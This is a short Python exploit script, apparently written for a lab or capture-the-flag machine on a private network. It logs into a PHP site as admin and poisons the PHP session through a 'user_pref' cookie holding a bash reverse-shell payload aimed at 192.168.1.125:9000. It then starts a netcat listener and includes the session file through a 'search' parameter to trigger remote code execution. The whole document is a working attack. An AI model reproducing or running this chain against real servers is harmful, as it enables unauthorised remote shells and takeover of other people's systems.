import urllib3
import subprocess
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

session = requests.Session()

url = 'http://192.168.1.136'

loginURL = url + '/authenticate.php'

# Login
data = {'username':'admin','password':'8C6976E5B5410415BDE908BD4DEE15DFB167A9C873FC4BB8A81F6F2AB448A918'}
session.post(loginURL, verify=False, proxies=proxies, data=data)

# Saving cookie
homeURL = url + '/home.php'

session.cookies.set('user_pref','<?php system("bash -c \'bash -i >& /dev/tcp/192.168.1.125/9000 0>&1\'")?>', path='/', domain='192.168.1.136')
session.get(homeURL, verify=False, proxies=proxies)

# Accessing session file and getting reverse shell
nc_listener = subprocess.Popen(["nc","-nvlp","9000"])

sessFile = '/var/lib/php/sessions/sess_' + session.cookies['PHPSESSID']
data = {'search':sessFile}
session.post(homeURL, verify=False, proxies=proxies, data=data)

# nc_listener.wait()

